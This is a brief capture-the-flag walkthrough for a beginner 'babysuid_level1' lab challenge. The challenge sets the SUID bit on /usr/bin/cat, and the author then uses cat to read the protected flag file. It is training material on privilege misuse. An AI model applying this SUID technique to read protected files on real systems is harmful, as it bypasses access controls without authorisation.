First, lets go the challenge directory:
# cd ../../challenge 
Run the /babysuid_level1, for obtain the
suid level, and for get some hints for the problem:
# ./babysuid_level1
    Welcome to ./babysuid_level1!
    This challenge is part of a series of programs that
    exposes you to very simple programs that let you directly read the flag.
    I just set the SUID bit on /usr/bin/cat.
    Try to use it to read the flag!
    IMPORTANT: make sure to run me (./babysuid_level1) every time that you restart
    this challenge container to make sure that I set the SUID bit on /usr/bin/cat!]

After this, just go backwards and use cat on flag file

# cd ..
# cat flag
